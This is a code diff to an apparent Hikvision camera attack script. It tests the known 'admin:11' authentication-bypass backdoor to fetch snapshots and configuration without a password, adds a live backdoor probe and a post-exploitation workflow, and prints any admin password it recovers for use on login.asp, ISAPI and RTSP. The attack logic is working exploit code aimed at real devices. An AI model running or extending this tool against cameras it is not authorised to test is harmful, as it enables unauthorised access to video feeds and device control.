@@ -76,6 +76,8 @@ def _ports_for_host(host: str) -> list[int]:
 
 def test_backdoor(host: str, port: int = 80) -> dict:
     """Backdoor bypass — snapshot/config without real password."""
+    from engines.hikvision_workflow import backdoor_endpoint_ok
+
     base = _base_url(host, port)
     auth_q = f"?auth={BACKDOOR_B64}"
     session = _session()
@@ -95,7 +97,7 @@ def test_backdoor(host: str, port: int = 80) -> dict:
                 "url": url,
                 "status": r.status_code,
                 "size": len(r.content),
-                "ok": r.status_code == 200 and len(r.content) > 100,
+                "ok": backdoor_endpoint_ok(name, r.status_code, r.content),
             }
         except requests.RequestException as exc:
             results[name] = {"url": url, "status": "error", "error": str(exc), "ok": False}
@@ -217,21 +219,27 @@ def main() -> int:
             found_real = pw
             break
 
-    print("\n[4] CVE INTELLIGENCE (firmware → CVE map)")
-    from engines.device_cve_checker import assess_hikvision, print_cve_report
+    from engines.hikvision_workflow import HikvisionRunContext, probe_backdoor_live, run_post_test_workflow
 
-    auth_tuple = ("admin", found_real) if found_real else None
-    try:
-        intel = assess_hikvision(host, port=primary_port, auth=auth_tuple)
-        print_cve_report(intel)
-    except Exception as exc:
-        print(f"    [!] CVE intelligence skipped: {exc}")
+    backdoor_ok = any(v.get("ok") for v in backdoor.values()) or probe_backdoor_live(host, primary_port)
+
+    ctx = HikvisionRunContext(
+        host=host,
+        http_port=primary_port,
+        http_ports=http_ports,
+        backdoor_confirmed=backdoor_ok,
+        digest_valid=bool(found_real),
+        digest_password=found_real,
+    )
+    run_post_test_workflow(ctx)
 
     print("\n" + "=" * 70)
     print("  CONCLUSION")
     print("=" * 70)
     if backdoor.get("snapshot", {}).get("ok"):
         print("  Backdoor snapshot: WORKS without real password (admin:11 bypass)")
+    elif backdoor_ok:
+        print("  Backdoor (users/config): likely WORKS — see snapshots/ and hikvision_test_report.json")
     if found_real:
         print(f"  REAL PASSWORD    : admin:{found_real}")
         print("  Use this for login.asp / ISAPI / RTSP — NOT admin:11")
@@ -244,7 +252,7 @@ def main() -> int:
     if args.full:
         run_full_hunt(host)
 
-    return 0 if found_real or backdoor.get("snapshot", {}).get("ok") else 1
+    return 0 if found_real or backdoor_ok else 1
 
 
 if __name__ == "__main__":
